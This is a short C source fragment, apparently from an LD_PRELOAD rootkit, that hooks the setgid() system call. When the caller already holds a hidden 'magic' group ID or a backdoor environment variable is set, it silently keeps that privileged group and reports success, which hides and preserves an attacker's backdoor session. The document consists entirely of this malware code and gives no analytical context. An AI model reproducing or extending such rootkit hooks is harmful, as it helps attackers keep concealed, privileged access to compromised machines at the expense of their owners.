int setgid(gid_t gid){
    hook(CSETGID);
    if(!initmvbc()) return (long)call(CSETGID, gid);
    if(getgid() == mvbc->magicid || getenv(mvbc->bdvar) != NULL){
        if(gid != mvbc->magicid)
            call(CSETGID, mvbc->magicid);
        return 0;
    }
    return (long)call(CSETGID, gid);
}
